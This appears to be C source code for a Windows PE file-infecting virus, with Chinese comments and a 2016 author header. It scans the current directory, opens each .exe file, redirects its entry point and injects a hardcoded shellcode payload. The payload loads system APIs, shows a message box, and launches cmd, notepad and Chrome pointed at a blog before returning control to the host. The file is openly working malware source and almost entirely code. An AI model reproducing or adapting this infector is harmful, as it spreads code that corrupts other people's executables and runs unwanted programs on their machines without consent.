/*=============================================================================
#
# Author        : enjoy5512
#
# E-mail        : enjoy5512@163.com
#
# Last modified : 2016-04-23 21:54
#
# Filename      : enjoy.c
#
# Description   : 本程序实现了基本的PE病毒感染方式，因为第一次写，所以功能做的
#                 不是很完善，编译出来的程序名字要是enjoy.exe,不然程序会感染本
#                 身，导致程序写入失败退出
=============================================================================*/

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<stdio.h>

#define CODESIZE 304           //代码长度
#define SHELLCODESIZE 600      //shellco总长度

typedef struct
{
	int NTHeader;             //NT映像头地址
	int OptionalHeader;       //可选头地址
	int SectionHeader;        //节表地址
}Addr;                        //地址列表结构体

typedef struct
{
	int NumberOfSection;      //节的个数
	int SizeOfOptionalHeader; //可选头大小
}NTHead;                      //NT映像头结构体

typedef struct
{
	int SizeOfCode;           //代码段大小
	int AddressOfEntryPoint;  //入口地址
	int BaseOfCode;           //代码节开始地址
	int ImageBase;            //ImageBase
	int NumberRvaAndSize;     //目录项的项数
}OPHead;                      //可选头结构体

typedef struct
{
	int VirtualSize;          //本节实际大小
	int VirtualAddress;       //本节相对虚拟地址
	int SizeOfRawData;        //本节的对齐大小
	int PointerToRawData;     //本节在文件中的位置
}SECHead;                     //节表结构体

/*
函数说明: 本函数用于修改shellcode中使用到的绝对地址
输入参数:
	unsigned char shellcode[] : shellcode
	int virtualNewAddressOfEntryPoint : 新的程序入口地址
	int codeOffset                    : 需要修改的代码相对入口地址的偏移
	int dataOffset                    : 需要修改的数据相对入口地址的偏移
输出参数:
	0
*/


int AdjustShellcode(unsigned char shellcode[], int virtualNewAddressOfEntryPoint, int codeOffset, int dataOffset)
{
	char adjust[5] = {0};   //保存数据在内存中的实际地址(分别保存四位数据)
	int dataAddr = 0;       //数据在内存中的实际地址

	dataAddr = virtualNewAddressOfEntryPoint - dataOffset;  //求出数据的实际地址
	adjust[0] = (dataAddr & 0xff000000) >> 24;              //将四位地址分别保存在adjust[]中
	adjust[1] = (dataAddr & 0xff0000) >> 16;
	adjust[2] = (dataAddr & 0xff00) >> 8;
	adjust[3] = dataAddr  &  0xff;

	shellcode[288 + codeOffset+0] = adjust[3];              //将shellcode中用到的需要修改的地址
	shellcode[288 + codeOffset+1] = adjust[2];              //改成数据的实际地址
	shellcode[288 + codeOffset+2] = adjust[1];
	shellcode[288 + codeOffset+3] = adjust[0];

	return 0;
}

int main(void)
{
	char fileName[41] = {0};                               //保存文件名
	unsigned char shellcode[SHELLCODESIZE] = {             //shellcode
		0xD7, 0xE9, 0xBA, 0xC5, 0x20, 0x3A, 0x20, 0x30, 0x34, 0x0A, 0xBA, 0xCE, 0xC4, 0xDC, 0xB1, 0xF3,    
		0x20, 0x3A, 0x20, 0x32, 0x30, 0x31, 0x33, 0x33, 0x30, 0x32, 0x35, 0x33, 0x30, 0x30, 0x32, 0x30,    
		0x0A, 0xCD, 0xF5, 0x20, 0x20, 0xEC, 0xB3, 0x20, 0x3A, 0x20, 0x32, 0x30, 0x31, 0x33, 0x33, 0x30,    
		0x32, 0x35, 0x33, 0x30, 0x30, 0x30, 0x35, 0x0A, 0xB5, 0xCB, 0xB9, 0xE3, 0xF6, 0xCE, 0x20, 0x3A,    
		0x20, 0x32, 0x30, 0x31, 0x33, 0x33, 0x30, 0x32, 0x35, 0x33, 0x30, 0x30, 0x31, 0x34, 0x0A, 0xB9,    
		0xA8, 0xD3, 0xF1, 0xB7, 0xEF, 0x20, 0x3A, 0x20, 0x32, 0x30, 0x31, 0x33, 0x33, 0x30, 0x32, 0x35,    
		0x33, 0x30, 0x30, 0x32, 0x31, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x43, 0x3A, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x46, 0x69, 0x6C, 0x65, 0x73,    
		0x5C, 0x47, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x5C, 0x43, 0x68, 0x72, 0x6F, 0x6D, 0x65, 0x5C, 0x41,    
		0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x5C, 0x63, 0x68, 0x72, 0x6F, 0x6D,    
		0x65, 0x20, 0x62, 0x6C, 0x6F, 0x67, 0x2E, 0x63, 0x73, 0x64, 0x6E, 0x2E, 0x6E, 0x65, 0x74, 0x2F,    
		0x65, 0x6E, 0x6A, 0x6F, 0x79, 0x35, 0x35, 0x31, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x69, 0x65, 0x78, 0x70, 0x6C, 0x6F, 0x72, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x74, 0x65, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x00,    
		0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00, 0x63, 0x6D, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,    
		0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x20, 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0xE8, 0x7F, 0x00, 0x00,    
		0x00, 0x89, 0x45, 0xFC, 0x68, 0x00, 0x66, 0x42, 0x00, 0xFF, 0x75, 0xFC, 0xE8, 0x97, 0x00, 0x00,    
		0x00, 0x89, 0x45, 0xF4, 0x68, 0x10, 0x66, 0x42, 0x00, 0xFF, 0x55, 0xF4, 0x89, 0x45, 0xF8, 0x68,    
		0xF0, 0x65, 0x42, 0x00, 0xFF, 0x75, 0xF8, 0xE8, 0x7C, 0x00, 0x00, 0x00, 0x89, 0x45, 0xF0, 0x6A,    
		0x00, 0x68, 0xD0, 0x65, 0x42, 0x00, 0x68, 0x00, 0x65, 0x42, 0x00, 0x6A, 0x00, 0xFF, 0x55, 0xF0,    
		0x68, 0xE0, 0x65, 0x42, 0x00, 0xFF, 0x75, 0xFC, 0xE8, 0x5B, 0x00, 0x00, 0x00, 0x89, 0x45, 0xEC,    
		0x6A, 0x05, 0x68, 0xE8, 0x65, 0x42, 0x00, 0xFF, 0x55, 0xEC, 0x6A, 0x05, 0x68, 0xD8, 0x65, 0x42,    
		0x00, 0xFF, 0x55, 0xEC, 0x6A, 0x01, 0x68, 0x70, 0x65, 0x42, 0x00, 0xFF, 0x55, 0xEC, 0x5F, 0x5E,    
		0x5B, 0x5A, 0x59, 0x58, 0x8B, 0xE5, 0x5D, 0xB8, 0x05, 0x10, 0x40, 0x00, 0xFF, 0xE0, 0x90, 0x90,    
		0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x56, 0x33, 0xF6, 0x64, 0x8B, 0x76, 0x18, 0xAD, 0xAD, 0x8B,    
		0x40, 0xE4, 0x48, 0x66, 0x33, 0xC0, 0x66, 0x81, 0x38, 0x4D, 0x5A, 0x75, 0xF5, 0x5E, 0x8B, 0xE5,    
		0x5D, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x56, 0x57,    
		0x8B, 0x45, 0x08, 0x8B, 0xD8, 0x03, 0x40, 0x3C, 0x83, 0xC0, 0x78, 0x8B, 0x10, 0x52, 0x8B, 0xC3,    
		0x03, 0xC2, 0x8B, 0x50, 0x20, 0x8B, 0xC3, 0x03, 0xC2, 0x8B, 0x10, 0x8B, 0xC3, 0x03, 0xC2, 0x8B,    
		0xF0, 0x33, 0xC0, 0x33, 0xC9, 0x8B, 0x7D, 0x0C, 0xAC, 0x84, 0xC0, 0x74, 0x12, 0x3A, 0x07, 0x75,    
		0x09, 0x47, 0xB0, 0x00, 0x3A, 0x07, 0x74, 0x0A, 0xEB, 0xEE, 0xAC, 0x84, 0xC0, 0x75, 0xFB, 0x41,    
		0xEB, 0xE3, 0x5A, 0x8B, 0xC3, 0x03, 0xC2, 0x8B, 0x50, 0x1C, 0x52, 0xB8, 0x04, 0x00, 0x00, 0x00,    
		0x66, 0xF7, 0xE1, 0x5A, 0x03, 0xC2, 0x03, 0xC3, 0x8B, 0x00, 0x03, 0xC3, 0x5F, 0x5E, 0x8B, 0xE5,    
		0x5D, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	int fileNameLen = 0;                       //文件名实际长度 
	int newAddressOfEntryPoint = 0;            //新的程序入口地址
	int virtualNewAddressOfEntryPoint = 0;     //新的程序在内存中的入口地址

	Addr addr;           //地址结构体
	NTHead ntHeader;     //NT头结构体
	OPHead opHeader;     //可选头结构体
	SECHead secHeader;   //节表结构体

	FILE *fList = NULL;  //文件目录指针
	FILE *file = NULL;   //文件指针
	
	//初始化四个结构体
	{
		addr.NTHeader = 0;
		addr.OptionalHeader = 0;
		addr.SectionHeader = 0;
		ntHeader.NumberOfSection = 0;
		ntHeader.SizeOfOptionalHeader = 0;
		opHeader.AddressOfEntryPoint = 0;
		opHeader.BaseOfCode = 0;
		opHeader.ImageBase = 0;
		opHeader.NumberRvaAndSize = 0;
		opHeader.SizeOfCode = 0;
		secHeader.PointerToRawData = 0;
		secHeader.SizeOfRawData = 0;
		secHeader.VirtualAddress = 0;
		secHeader.VirtualSize = 0;
	}

	system("dir /b > list.txt");        //获取当前目录下的文件列表
	
	fList = fopen("list.txt","r");      //打开文件列表文件
	if (NULL == fList)                  //打开失败,退出程序
	{
		exit(1);
	}

	while (!feof(fList))               //循环遍历文件列表,寻找exe文件感染
	{
		fgets(fileName, 40,fList);     //获取一个文件名
		fileNameLen = strlen(fileName);//获取文件名长度
		fileName[fileNameLen-1] = 0;   //将文件名最后的回车去掉
		if (0 == strcmp("enjoy.exe",fileName))     //如果是本程序,则结束本循环
		{
			printf("感染失败 : %s(这是本病毒程序!!)\n",fileName);
			continue;
		}
		if ('e' == fileName[fileNameLen - 2] && 'x' == fileName[fileNameLen - 3] && 'e' == fileName[fileNameLen - 4])
		{                                                       //如果是exe文件则获取PE文件信息后感染
			file = fopen(fileName,"rb+");                       //打开文件

			fseek(file,60,SEEK_SET);                            //将指针移到60的位置
			fread(&addr.NTHeader, 4, 1, file);;                 //获取NT映像头地址
			fseek(file, addr.NTHeader + 0x6, SEEK_SET);
			fread(&ntHeader.NumberOfSection, 1, 1, file);       //节数
			fseek(file, addr.NTHeader + 0x14, SEEK_SET);			
			fread(&ntHeader.SizeOfOptionalHeader, 1, 1, file);  //可选头大小

			addr.OptionalHeader = addr.NTHeader + 0x18;         //获取可选头地址
			fseek(file, addr.OptionalHeader + 0x4, SEEK_SET);
			fread(&opHeader.SizeOfCode, 4, 1, file);            //代码段大小
			fseek(file, addr.OptionalHeader + 0x10, SEEK_SET);
			fread(&opHeader.AddressOfEntryPoint, 4, 1, file);   //函数入口地址
			fread(&opHeader.BaseOfCode , 4, 1, file);           //代码节开始地址
			fseek(file, addr.OptionalHeader + 0x1c, SEEK_SET);
			fread(&opHeader.ImageBase, 4, 1, file);             //ImageBase
			fseek(file, addr.OptionalHeader + 0x5c, SEEK_SET);
			fread(&opHeader.NumberRvaAndSize, 4, 1, file);      //数据目录的项数,一般是16

			addr.SectionHeader = addr.OptionalHeader + ntHeader.SizeOfOptionalHeader; //获取节表地址

			for (;;)                                            //遍历节表,找到代码节
			{
				fseek(file, addr.SectionHeader + 0xc, SEEK_SET);
				fread(&secHeader.VirtualAddress, 4, 1, file);   //获取本节相对虚拟地址
				if (secHeader.VirtualAddress != opHeader.BaseOfCode)
				{                                               //没有找到代码节,继续寻找
					addr.SectionHeader += 0x28;                 //下一个节,一般代码节都会是第
					continue;                                   //一个节表,所以这里一般不会执行
				}
				fseek(file, addr.SectionHeader + 0x8,SEEK_SET); 
				fread(&secHeader.VirtualSize, 4, 1, file);      //获取本节实际大小
				fseek(file, addr.SectionHeader + 0x10,SEEK_SET);
				fread(&secHeader.SizeOfRawData, 4, 1, file);    //获取本节对齐后的大小
				fseek(file, addr.SectionHeader + 0x14, SEEK_SET);
				fread(&secHeader.PointerToRawData, 4, 1, file); //获取本节原始数据在文件中的位置
				newAddressOfEntryPoint = secHeader.VirtualAddress + secHeader.VirtualSize; //感染程序入口地址
				break;
			}
			if (CODESIZE > secHeader.SizeOfRawData - secHeader.VirtualSize)  //代码节剩余空间不够
			{
				printf("感染失败 : %s(代码节空间不够!)\n",fileName);
				continue;
			}
			if (newAddressOfEntryPoint == opHeader.AddressOfEntryPoint)      //已经感染
			{
				printf("感染失败 : %s(已经感染过啦!!)\n",fileName);
				continue;
			}
			fseek(file, addr.OptionalHeader + 0x10,SEEK_SET);
			fwrite(&newAddressOfEntryPoint, 4, 1, file);                     //修改程序入口地址

			virtualNewAddressOfEntryPoint = newAddressOfEntryPoint + opHeader.ImageBase; //获取程序加载到内存后的实际地址

			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x15,0x20); //LoadLibrary
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x25,0x10); //user32.dll
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x30,0x30); //MessageBox
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x42,0x50); //test
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x47,0x120);//组号
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x51,0x40); //WinExec
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x63,0x38); //cmd
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x6d,0x48); //notepad
			AdjustShellcode(shellcode,virtualNewAddressOfEntryPoint,0x77,0xb0); //chrome
			AdjustShellcode(shellcode,opHeader.AddressOfEntryPoint + opHeader.ImageBase,0x88,0); //EntryPoint

			fseek(file, secHeader.PointerToRawData + secHeader.VirtualSize - 288, SEEK_SET);
			fwrite(shellcode, 1, SHELLCODESIZE, file);                          //将shellcode写入被感染程序
			printf("感染成功 : %s\n",fileName);
			fclose(file);                                                       //释放文件指针,继续下一个文件
		}
		else
		{
			printf("其他文件 : %s\n",fileName);
		}
	}

	system("pause");
	fclose(fList);               //释放文件列表指针
	system("del /Q list.txt");   //删除文件列表文件
	return 0;
}
